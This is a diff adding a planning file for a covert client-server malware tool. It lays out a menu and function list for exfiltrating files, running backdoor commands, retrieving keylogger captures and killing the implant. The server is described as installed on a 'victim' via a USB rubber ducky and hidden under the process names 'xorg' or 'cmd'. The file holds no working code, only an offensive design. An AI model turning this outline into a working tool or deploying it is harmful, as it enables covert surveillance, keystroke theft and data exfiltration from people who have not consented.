@@ -1,0 +1,66 @@
+Client useage: 	#./client
+		Please enter port: 
+		Please enter hostname:
+		Enter the Exfilteration path:
+		Waiting for responce...
+		Connected: secured!
+		Please select one of the following options:
+		1. Exfilterate file 
+		2. run backdoor commands
+		3. receive keylogger file 
+		4. kill backdoor
+		5. kill client (keep the backdoor open. you can connect again later)
+
+Client:
+
+- ask user to enter hostname and port to connect to 
+- if connection successful, display "Success" and process id of server on the screen,
+- provde options to the user -
+	- exfiltereate file 
+	- run backdoor commands 
+	- retreive keylogger file 
+	- terminate program on the server
+	- terminate terminate client 
+- send option selected to server 
+- listen for response from server
+
+functions:
+
+client()
+options()
+encrypt()
+sendpkt()
+receive()
+decryptpkt()
+savefile()
+killprogram()
+
+
+Server:
+
+Server useage: connect the rubber ducky to the victim. Server will start in the background mode. If OS is linux it wll be called xorg if its windows it will be called cmd
+
+
+- Listen for probes by the client 
+- accept connection on particular port 
+- listen for option selected 
+	- if exfilterate selected start monitoring and exfiltereate files from location
+	- if backdoor selected:
+		- listen for commands to execute
+		- send output to client
+		- if asked to quit go back to listening mode
+	- if keylogger mode selected 
+		- send keystrokes file to client 
+	- if terminate server command received
+		- clean up files and kill server
+Functions:
+
+server()
+decrypt()
+exfil()
+backdoor()
+keylogger()
+enryptpkt()
+sendfile()
+killprogram()
+
